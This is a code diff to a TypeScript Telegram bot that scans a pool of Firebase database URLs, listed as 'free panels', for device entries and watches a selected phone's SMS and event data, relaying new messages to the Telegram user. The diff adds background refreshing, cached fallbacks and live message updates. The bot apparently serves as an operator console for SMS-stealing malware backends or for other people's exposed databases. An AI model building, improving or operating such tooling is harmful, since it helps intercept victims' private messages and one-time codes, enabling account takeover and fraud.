@@ -32,7 +32,13 @@ const bot = new Telegraf(config.TELEGRAM_BOT_TOKEN);
 type FreshSnapshot = { devices: Device[]; summary: DeviceSummary };
 type BatchResult = { url: string; status: "connected" | "failed" | "duplicate" | "skipped"; detail: string; summary?: DeviceSummary };
 const scanLocks = new Map<string, Promise<FreshSnapshot>>();
-type DeviceMonitor = { active: boolean; timer: ReturnType<typeof setInterval> };
+type DeviceMonitor = {
+  active: boolean;
+  timer: ReturnType<typeof setInterval>;
+  chatId?: number;
+  messageId?: number;
+  sourceName?: string;
+};
 const monitors = new Map<string, DeviceMonitor>();
 const answeredCallbacks = new WeakSet<object>();
 const POOL_SCAN_TIMEOUT_MS = 8_000;
@@ -47,6 +53,7 @@ type PoolSourceSnapshot = {
   panel: Awaited<ReturnType<typeof getFreeFirebasePanels>>[number];
   devices: Device[];
   ok: boolean;
+  stale?: boolean;
   error?: string;
 };
 type PoolSnapshot = {
@@ -55,6 +62,8 @@ type PoolSnapshot = {
 };
 let poolSnapshotCache: { value: PoolSnapshot; expiresAt: number } | undefined;
 let poolSnapshotPromise: Promise<PoolSnapshot> | undefined;
+const poolLastGoodSources = new Map<string, PoolSourceSnapshot>();
+let poolRefreshTimer: ReturnType<typeof setInterval> | undefined;
 
 function invalidatePoolSnapshot() {
   poolSnapshotCache = undefined;
@@ -63,6 +72,11 @@ function invalidatePoolSnapshot() {
 function userId(ctx: Context): number {
   if (!ctx.from) throw new Error("Missing Telegram user");
   return ctx.from.id;
+}
+
+function callbackMessageId(ctx: Context): number | undefined {
+  if (!("callbackQuery" in ctx) || !ctx.callbackQuery?.message) return undefined;
+  return ctx.callbackQuery.message.message_id;
 }
 
 function admin(ctx: Context) {
@@ -253,7 +267,9 @@ function aggregateHomeSources(
     sources.set(connection.firebaseUrl, summaries.get(connection.id) ?? { total: 0, online: 0, offline: 0 });
   }
   for (const source of pool?.sources ?? []) {
-    if (source.ok) sources.set(source.panel.firebaseUrl, summaryForDevices(source.devices));
+    if (source.ok || source.stale || !sources.has(source.panel.firebaseUrl)) {
+      sources.set(source.panel.firebaseUrl, summaryForDevices(source.devices));
+    }
   }
   const devices = { total: 0, online: 0, offline: 0 };
   for (const summary of sources.values()) addSummary(devices, summary);
@@ -271,12 +287,16 @@ async function readPoolSources(force = false): Promise<PoolSnapshot> {
     const results = await Promise.all(panels.map(async panel => {
       try {
         const root = await readFirebase(panel.firebaseUrl, POOL_SCAN_TIMEOUT_MS);
-        return { panel, devices: extractDevices(root), ok: true } satisfies PoolSourceSnapshot;
+        const result = { panel, devices: extractDevices(root), ok: true } satisfies PoolSourceSnapshot;
+        poolLastGoodSources.set(panel.firebaseUrl, result);
+        return result;
       } catch (error) {
+        const previous = poolLastGoodSources.get(panel.firebaseUrl);
         return {
           panel,
-          devices: [],
+          devices: previous?.devices ?? [],
           ok: false,
+          stale: Boolean(previous),
           error: shortError(error)
         } satisfies PoolSourceSnapshot;
       }
@@ -293,14 +313,23 @@ async function readPoolSources(force = false): Promise<PoolSnapshot> {
   }
 }
 
+function cachedPoolSources(): PoolSnapshot | undefined {
+  if (poolSnapshotCache) return poolSnapshotCache.value;
+  if (!poolLastGoodSources.size) return undefined;
+  return {
+    sources: [...poolLastGoodSources.values()],
+    configuredSources: poolLastGoodSources.size
+  };
+}
+
 async function renderHome(ctx: Context, includeImage = false, refresh = true) {
   const id = userId(ctx);
   unselectDevice(id);
-  clearSession(id);
   const [{ connections, summaries }, pool] = await Promise.all([
     refresh ? refreshAllConnections(id) : allSummary(id),
-    readPoolSources(refresh).catch(() => undefined)
+    refresh ? readPoolSources(true).catch(() => cachedPoolSources()) : cachedPoolSources()
   ]);
+  clearSession(id);
   const combined = aggregateHomeSources(connections, summaries, pool);
   const limit = Number(await getSetting("firebase_limit", "0"));
   await editOrReplyWithConfiguredImage(
@@ -309,6 +338,37 @@ async function renderHome(ctx: Context, includeImage = false, refresh = true) {
     homeKeyboard(admin(ctx)),
     includeImage ? IMAGE_SETTING_KEYS.welcome : undefined
   );
+}
+
+function refreshHomeInBackground(ctx: Context) {
+  const id = userId(ctx);
+  void (async () => {
+    try {
+      if (getSession(id).screen !== "home") return;
+      await renderHome(ctx, false, true);
+    } catch (error) {
+      await logSystem("warn", "background_home_refresh_failed", shortError(error), id);
+    }
+  })();
+}
+
+function startPoolRefreshLoop() {
+  if (poolRefreshTimer) return;
+  const refresh = async () => {
+    try {
+      await readPoolSources(true);
+    } catch (error) {
+      await logSystem("warn", "pool_auto_refresh_failed", shortError(error));
+    }
+  };
+  poolRefreshTimer = setInterval(() => { void refresh(); }, config.FIREBASE_SCAN_INTERVAL_MS);
+  void refresh();
+}
+
+function stopPoolRefreshLoop() {
+  if (!poolRefreshTimer) return;
+  clearInterval(poolRefreshTimer);
+  poolRefreshTimer = undefined;
 }
 
 async function renderFirebaseList(ctx: Context) {
@@ -555,7 +615,7 @@ async function addFreePoolFromText(ctx: Context, text: string) {
   const entries = splitFreePoolEntries(text);
   if (!entries.length) throw new Error("Send one or more Firebase URLs, one per line or separated by commas.");
   const before = await readPoolSources(true);
-  const beforeSummary = before.sources.filter(source => source.ok).reduce((total, source) => {
+  const beforeSummary = before.sources.filter(source => source.ok || source.stale).reduce((total, source) => {
     addSummary(total, summaryForDevices(source.devices));
     return total;
   }, { total: 0, online: 0, offline: 0 });
@@ -590,11 +650,13 @@ async function addFreePoolFromText(ctx: Context, text: string) {
 
   invalidatePoolSnapshot();
   const after = await readPoolSources(true);
-  const afterSummary = after.sources.filter(source => source.ok).reduce((total, source) => {
+  const afterSummary = after.sources.filter(source => source.ok || source.stale).reduce((total, source) => {
     addSummary(total, summaryForDevices(source.devices));
     return total;
   }, { total: 0, online: 0, offline: 0 });
-  const newDevices = Math.max(0, afterSummary.total - beforeSummary.total);
+  const newDevices = results
+    .filter(result => result.status === "connected")
+    .reduce((total, result) => total + (result.summary?.total ?? 0), 0);
   setSession(id, { awaiting: undefined });
   const lines = [
     "━━━━━━━━━━━━━━━━━━━━",
@@ -700,7 +762,9 @@ async function addFirebaseBatch(ctx: Context, rawText: string) {
     addSummary(acc, summary);
     return acc;
   }, { total: 0, online: 0, offline: 0 });
-  const newDevices = Math.max(0, totals.total - beforeTotals.total);
+  const newDevices = results
+    .filter(result => result.status === "connected")
+    .reduce((total, result) => total + (result.summary?.total ?? 0), 0);
   const lines = [
     "━━━━━━━━━━━━━━━━━━━━",
     "📊 FIREBASE BATCH RESULT",
@@ -818,7 +882,11 @@ async function renderSelectedDevice(ctx: Context, selected: SelectedPoolDevice) 
     selectedDeviceId: selected.device.normalizedDeviceId,
     monitoring: true,
   });
-  startMonitor(id, selected.firebaseId, selected.device);
+  startMonitor(id, selected.firebaseId, selected.device, {
+    chatId: ctx.chat?.id,
+    messageId: callbackMessageId(ctx),
+    sourceName: selected.sourceName
+  });
   await editOrReplyWithConfiguredImage(
     ctx,
     deviceDetailText(selected.device, selected.sourceName),
@@ -1047,7 +1115,13 @@ bot.on("photo", async ctx => {
 });
 
 bot.action("noop", async ctx => answerCallback(ctx));
-bot.action("home", async ctx => { unselectDevice(userId(ctx)); if (await guard(ctx)) { await answerCallback(ctx); await renderHome(ctx); } });
+bot.action("home", async ctx => {
+  unselectDevice(userId(ctx));
+  if (!(await guard(ctx))) return;
+  await answerCallback(ctx);
+  await renderHome(ctx, false, false);
+  refreshHomeInBackground(ctx);
+});
 bot.action("free_panels", async ctx => {
   if (await baseGuard(ctx)) {
     await answerCallback(ctx);
@@ -1186,7 +1260,11 @@ bot.action(/^device:([^:]+):(.+)$/, async ctx => {
   }
   unselectDevice(userId(ctx));
   setSession(userId(ctx), { selectedFirebaseId: firebaseId, selectedDeviceId: normalized, screen: "device_detail", monitoring: true });
-  startMonitor(userId(ctx), firebaseId, device);
+  startMonitor(userId(ctx), firebaseId, device, {
+    chatId: ctx.chat?.id,
+    messageId: callbackMessageId(ctx),
+    sourceName: connection.displayName
+  });
   await answerCallback(ctx);
   await editOrReply(ctx, deviceDetailText(device, connection.displayName), deviceDetailKeyboard(firebaseId, normalized));
 });
@@ -1217,7 +1295,18 @@ bot.action(/^events:([^:]+):(.+)$/, async ctx => {
 });
 bot.action(/^stop_events:([^:]+):(.+)$/, async ctx => { unselectDevice(userId(ctx)); clearSession(userId(ctx)); await answerCallback(ctx); await editOrReply(ctx, "🔴 Number Unselected\n\nMonitoring stopped. No more messages will be sent for this number.", navKeyboard("home")); });
 bot.action("unselect_device", async ctx => { const id = userId(ctx); unselectDevice(id); clearSession(id); await answerCallback(ctx); await editOrReply(ctx, "✅ Number Unselected\n\nMonitoring stopped. No more messages will be sent for this number.", navKeyboard("home")); });
-bot.action("back", async ctx => { unselectDevice(userId(ctx)); if (await guard(ctx)) { await answerCallback(ctx); const screen = back(userId(ctx)); if (screen === "my_firebase") await renderFirebaseList(ctx); else if (screen === "devices") await renderDevices(ctx); else await renderHome(ctx); } });
+bot.action("back", async ctx => {
+  unselectDevice(userId(ctx));
+  if (!(await guard(ctx))) return;
+  await answerCallback(ctx);
+  const screen = back(userId(ctx));
+  if (screen === "my_firebase") await renderFirebaseList(ctx);
+  else if (screen === "devices") await renderDevices(ctx);
+  else {
+    await renderHome(ctx, false, false);
+    refreshHomeInBackground(ctx);
+  }
+});
 
 bot.command("admin", async ctx => {
   if (!(await guard(ctx))) return;
@@ -1499,7 +1588,12 @@ bot.action(/^broadcast_send:(.+)$/, async ctx => {
   await editOrReply(ctx, `📊 BROADCAST COMPLETE\n\n✅ Sent: ${sent}\n❌ Failed: ${failed}\n🚫 Blocked: ${failed}`, navKeyboard("admin"));
 });
 
-function startMonitor(telegramId: number, firebaseId: string, device: Device) {
+function startMonitor(
+  telegramId: number,
+  firebaseId: string,
+  device: Device,
+  target: Pick<DeviceMonitor, "chatId" | "messageId" | "sourceName"> = {}
+) {
   const key = `${telegramId}:${firebaseId}:${device.normalizedDeviceId}`;
   if (monitors.has(key)) return;
   let initialized = false;
@@ -1520,8 +1614,47 @@ function startMonitor(telegramId: number, firebaseId: string, device: Device) {
       }
       const root = await readFirebase(connection.firebaseUrl);
       if (!isActive()) return;
-      const latest = extractDevices(root).find(d => d.normalizedDeviceId === device.normalizedDeviceId);
-      if (!latest) return;
+      const latestDevices = extractDevices(root);
+      await replaceDevices(firebaseId, latestDevices);
+      await markConnectionChecked(firebaseId, "connected");
+      const latest = latestDevices.find(d => d.normalizedDeviceId === device.normalizedDeviceId);
+      if (!latest) {
+        if (monitor?.chatId && monitor.messageId) {
+          try {
+            await bot.telegram.editMessageText(
+              monitor.chatId,
+              monitor.messageId,
+              undefined,
+              "⚠️ The selected device is no longer present in the latest Firebase snapshot.",
+              { reply_markup: premiumizeKeyboard(navKeyboard("home")) as any }
+            );
+          } catch {
+            // The user may have navigated away or the message may be stale.
+          }
+        }
+        stopMonitor(telegramId, firebaseId, device.normalizedDeviceId);
+        return;
+      }
+      if (
+        monitor?.chatId &&
+        monitor.messageId &&
+        monitor.sourceName &&
+        getSession(telegramId).screen === "device_detail" &&
+        getSession(telegramId).selectedFirebaseId === firebaseId &&
+        getSession(telegramId).selectedDeviceId === latest.normalizedDeviceId
+      ) {
+        try {
+          await bot.telegram.editMessageText(
+            monitor.chatId,
+            monitor.messageId,
+            undefined,
+            deviceDetailText(latest, monitor.sourceName),
+            { reply_markup: premiumizeKeyboard(deviceDetailKeyboard(firebaseId, latest.normalizedDeviceId)) as any }
+          );
+        } catch {
+          // Telegram rejects no-op edits and edits to messages that were replaced.
+        }
+      }
       // SMS/event data is sometimes stored beside the device branch or keyed
       // by the selected phone number, so search the full snapshot as well.
       const events = collectEvents(latest, root);
@@ -1544,7 +1677,11 @@ function startMonitor(telegramId: number, firebaseId: string, device: Device) {
       }
     } catch (error) { await logSystem("error", "event_monitor_failed", error instanceof Error ? error.message : String(error), telegramId); }
   };
-  monitor = { active: true, timer: setInterval(() => { void poll(); }, config.FIREBASE_SCAN_INTERVAL_MS) };
+  monitor = {
+    active: true,
+    timer: setInterval(() => { void poll(); }, config.FIREBASE_SCAN_INTERVAL_MS),
+    ...target
+  };
   monitors.set(key, monitor);
   void poll();
 }
@@ -1583,8 +1720,18 @@ function stopMonitorsFor(firebaseId: string) {
 }
 
 bot.catch(async (error, ctx) => { await logSystem("error", "unexpected_exception", error instanceof Error ? error.message : String(error), ctx.from?.id); });
-process.once("SIGINT", async () => { for (const monitor of monitors.values()) { monitor.active = false; clearInterval(monitor.timer); } await pool.end(); bot.stop("SIGINT"); });
-process.once("SIGTERM", async () => { for (const monitor of monitors.values()) { monitor.active = false; clearInterval(monitor.timer); } await pool.end(); bot.stop("SIGTERM"); });
+process.once("SIGINT", async () => {
+  stopPoolRefreshLoop();
+  for (const monitor of monitors.values()) { monitor.active = false; clearInterval(monitor.timer); }
+  await pool.end();
+  bot.stop("SIGINT");
+});
+process.once("SIGTERM", async () => {
+  stopPoolRefreshLoop();
+  for (const monitor of monitors.values()) { monitor.active = false; clearInterval(monitor.timer); }
+  await pool.end();
+  bot.stop("SIGTERM");
+});
 
 export async function startTelegramBot(): Promise<void> {
   logger.info("Initializing Telegram bot database schema");
@@ -1596,5 +1743,6 @@ export async function startTelegramBot(): Promise<void> {
     await logSystem("error", "telegram_polling_failed", error instanceof Error ? error.message : String(error));
     logger.error({ err: error }, "Telegram polling stopped");
   });
+  startPoolRefreshLoop();
   logger.info("Telegram polling client initialized");
 }
